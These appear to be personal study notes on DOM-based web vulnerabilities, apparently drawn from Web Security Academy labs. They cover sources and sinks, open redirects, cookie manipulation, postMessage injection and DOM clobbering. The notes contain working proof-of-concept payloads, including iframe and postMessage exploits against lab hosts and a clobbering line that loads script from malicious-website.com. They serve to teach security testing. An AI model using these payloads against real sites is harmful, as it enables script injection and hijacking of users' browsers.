# DOM vulnerabilities
DOM is a hierarchical model of elements of website. Vulnerabilities appear when JavaScript takes attacker-controlled value (source) and passes it to dangerous function (sink)  
## Source
Source is a JavaScript property that accepts data that is potentially attacker controlled. For example `location.search` reads input from a query string. Another examples are `documnet.referrer` and `document.cookie` properties, because they are also attacker controlled.  
## Sinks
Sink is a potentially dangerous JS function or DOM object that can cause undesirable effect if attacker-controlled data passed to it.  
`eval()` function processes argument that is passed to JavaScript.  
`document.body.innerHTML` is a HTML sink because it allows attacker to inject malicious HTML.  
The most common source is URL which is typically accessed with the `location` object.  
For example:
```
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
  location = goto;
}
```
Is vulnerable code because it provides open-redirect vulnerability and will accept URL with redirect which starts with `https://`:
```
https://www.innocent-website.com/example#https://www.evil-user.net
```
## Common sources
```
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```
## Dangerous sinks and vulns:
```
DOM XSS LABS 	                    document.write()
Open redirection LABS 	            window.location
Cookie manipulation LABS 	        document.cookie
JavaScript injection 	            eval()
Document-domain manipulation 	    document.domain
WebSocket-URL poisoning 	        WebSocket()
Link manipulation 	                element.src
Web message manipulation 	        postMessage()
Ajax request-header manipulation 	setRequestHeader()
Local file-path manipulation 	    FileReader.readAsText()
Client-side SQL injection 	        ExecuteSql()
HTML5-storage manipulation 	        sessionStorage.setItem()
Client-side XPath injection 	    document.evaluate()
Client-side JSON injection 	        JSON.parse()
DOM-data manipulation 	            element.setAttribute()
Denial of service 	                RegExp()

```

## DOM-based open redirects
DOM-based open-redirection vulnerabilities arise when a script writes attacker-controllable data into a sink that can trigger cross-domain navigation  
```
let url = /https?:\/\/.+/.exec(location.hash);
if (url) {
  location = url[0];
}
```
An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will cause a redirection to an arbitrary external domain.   
An attacker could construct a URL with the javascript: pseudo-protocol to execute arbitrary code when the URL is processed by the browser.   
For example:
```
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
```
Here we can use `url` to exploit open redirection vuln:
```
https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/
```
### Sinks for open-redirect:
```
location
location.host
location.hostname
location.href
location.pathname
location.search
location.protocol
location.assign()
location.replace()
open()
element.srcdoc
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.ajax()
$.ajax()
```
## Cookie manipulation
In usch case attacker can craft URL which will write arbitrary data into user's cookie  
For example, if JavaScript writes data from a source into document.cookie without sanitizing it first, an attacker can manipulate the value of a single cookie to inject arbitrary values: 
```
document.cookie = 'cookieName='+location.hash.slice(1);
```
If cookie values are reflected somewhere, it could lead to XSS  
```
https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>
```

Exampkle of attack:
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```
The original source of the iframe matches the URL of one of the product pages, except there is a JavaScript payload added to the end. When the iframe loads for the first time, the browser temporarily opens the malicious URL, which is then saved as the value of the lastViewedProduct cookie. The onload event handler ensures that the victim is then immediately redirected to the home page, unaware that this manipulation ever took place. While the victim's browser has the poisoned cookie saved, loading the home page will cause the payload to execute.   
## DOM-based JS injection
DOM-based JavaScript-injection vulnerabilities arise when a script executes attacker-controllable data as JavaScript. An attacker may be able to use the vulnerability to construct a URL that, if visited by another user, will cause arbitrary JavaScript supplied by the attacker to execute in the context of the user's browser session.  
Sinks:
```
eval()
Function()
setTimeout()
setInterval()
setImmediate()
execCommand()
execScript()
msSetImmediate()
range.createContextualFragment()
crypto.generateCRMFRequest()
```
## DOM-based document-domain manipulation
Document-domain manipulation vulnerabilities arise when a script uses attacker-controllable data to set the document.domain property. An attacker may be able to use the vulnerability to construct a URL that, if visited by another user, will cause the response page to set an arbitrary document.domain value.  
## DOM-based link manipulation
```
element.href
element.src
element.action
```
## Web message manipulation
```
postMessage()
```
## DOM-based Ajax request-header manipulation
Using Ajax enables a website to make asynchronous requests to the server so that web applications can dynamically change content on the page without the need to reload the entire page. However, Ajax request-header manipulation vulnerabilities arise when a script writes attacker-controllable data into the request header of an Ajax request that is issued using an XmlHttpRequest object. An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will set an arbitrary header in the subsequent Ajax request. This can then be used as a starting point to chain together other kinds of attack, thereby increasing the potential severity of this vulnerability.  
```
XMLHttpRequest.setRequestHeader()
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.globalEval()
$.globalEval()
```
## DOM-based local file-path manipulation
Local file-path manipulation vulnerabilities arise when a script passes attacker-controllable data to a file-handling API as the filename parameter. An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will cause the user's browser to open an arbitrary local file.  
```
FileReader.readAsArrayBuffer()
FileReader.readAsBinaryString()
FileReader.readAsDataURL()
FileReader.readAsText()
FileReader.readAsFile()
FileReader.root.getFile()
```
## DOM-based client-side SQL injection
Client-side SQL-injection vulnerabilities arise when a script incorporates attacker-controllable data into a client-side SQL query in an unsafe way. An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will execute an arbitrary SQL query within the local SQL database of the user's browser.  
```
executeSql()
```
## DOM-based HTML5-storage manipulation
HTML5-storage manipulation vulnerabilities arise when a script stores attacker-controllable data in the HTML5 storage of the web browser (either localStorage or sessionStorage). An attacker may be able to use this behavior to construct a URL that, if visited by another user, will cause the user's browser to store attacker-controllable data.  
```
sessionStorage.setItem()
localStorage.setItem()
```
## DOM-based client-side XPath injection
DOM-based XPath-injection vulnerabilities arise when a script incorporates attacker-controllable data into an XPath query. An attacker may be able to use this behavior to construct a URL that, if visited by another application user, will trigger the execution of an arbitrary XPath query, which could cause different data to be retrieved and processed by the website.  
```
document.evaluate()
element.evaluate()
```
## DOM-based client-side JSON injection
DOM-based JSON-injection vulnerabilities arise when a script incorporates attacker-controllable data into a string that is parsed as a JSON data structure and then processed by the application. An attacker may be able to use this behavior to construct a URL that, if visited by another user, will cause arbitrary JSON data to be processed.  
```
JSON.parse()
jQuery.parseJSON()
$.parseJSON()
```
## DOM-data manipulation
DOM-data manipulation vulnerabilities arise when a script writes attacker-controllable data to a field within the DOM that is used within the visible UI or client-side logic. An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will modify the appearance or behavior of the client-side UI. DOM-data manipulation vulnerabilities can be exploited by both reflected and stored DOM-based attacks.  
```
script.src
script.text
script.textContent
script.innerText
element.setAttribute()
element.search
element.text
element.textContent
element.innerText
element.outerText
element.value
element.name
element.target
element.method
element.type
element.backgroundImage
element.cssText
element.codebase
document.title
document.implementation.createHTMLDocument()
history.pushState()
history.replaceState()
```
## DoS
```
requestFileSystem()
RegExp()
```
## Controlling the web message source
For example, an attacker could host a malicious iframe and use the postMessage() method to pass web message data to the vulnerable event listener, which then sends the payload to a sink on the parent page. This behavior means that you can use web messages as the source for propagating malicious data to any of those sinks.  
```
<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>
```
We can exploit such code with iframe:
```
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
```
As the event listener does not verify the origin of the message, and the postMessage() method specifies the targetOrigin "*", the event listener accepts the payload and passes it into a sink, in this case, the eval() function.   
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```
## Origin verification
If script has origin verification, it could be flawed. In example:
```
window.addEventListener('message', function(e) {
    if (e.origin.indexOf('normal-website.com') > -1) {
        eval(e.data);
    }
});
```
The indexOf method is used to try and verify that the origin of the incoming message is the normal-website.com domain. However, in practice, it only checks whether the string "normal-website.com" is contained anywhere in the origin URL. As a result, an attacker could easily bypass this verification step if the origin of their malicious message was http://www.normal-website.com.evil.net, for example.  
Same flaw could appear if used `startsWith()` or `endsWith()` methods.  
```
                   <script>
                        window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case "page-load":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case "load-channel":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case "player-height-changed":
                                    ACMEplayer.element.style.width = d.width + "px";
                                    ACMEplayer.element.style.height = d.height + "px";
                                    break;
                            }
                        }, false);
                    </script>
```
If source is parsed with `JSON.parse()` method, we can construct such exploit:
```
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```
 When the iframe we constructed loads, the postMessage() method sends a web message to the home page with the type load-channel. The event listener receives the message and parses it using JSON.parse() before sending it to the switch.  

The switch triggers the load-channel case, which assigns the url property of the message to the src attribute of the ACMEplayer.element iframe. However, in this case, the url property of the message actually contains our JavaScript payload.  

As the second argument specifies that any targetOrigin is allowed for the web message, and the event handler does not contain any form of origin check, the payload is set as the src of the ACMEplayer.element iframe. The print() function is called when the victim loads the page in their browser.   

## DOM clobbering
DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page. DOM clobbering is particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes id or name are whitelisted by the HTML filter. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.  
```
<script>
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
```
exploit:
```
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```
Another common technique is to use a form element along with an element such as input to clobber DOM properties. For example, clobbering the attributes property enables you to bypass client-side filters that use it in their logic. Although the filter will enumerate the attributes property, it will not actually remove any attributes because the property has been clobbered with a DOM node. As a result, you will be able to inject malicious attributes that would normally be filtered out
```
<form onclick=alert(1)><input id=attributes>Click me
```
In this case, the client-side filter would traverse the DOM and encounter a whitelisted form element. Normally, the filter would loop through the attributes property of the form element and remove any blacklisted attributes. However, because the attributes property has been clobbered with the input element, the filter loops through the input element instead. As the input element has an undefined length, the conditions for the for loop of the filter (for example `i<element.attributes.length`) are not met, and the filter simply moves on to the next element instead. This results in the onclick event being ignored altogether by the filter, which subsequently allows the alert() function to be called in the browser.  
  
  Exploit:
On target:
```
<form id=x tabindex=0 onfocus=print()><input id=attributes>
``` 
On exploit server:
```
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
```
When the iframe is loaded, after a 500ms delay, it adds the #x fragment to the end of the page URL. The delay is necessary to make sure that the comment containing the injection is loaded before the JavaScript is executed. This causes the browser to focus on the element with the ID "x", which is the form we created inside the comment. The onfocus event handler then calls the print() function.  
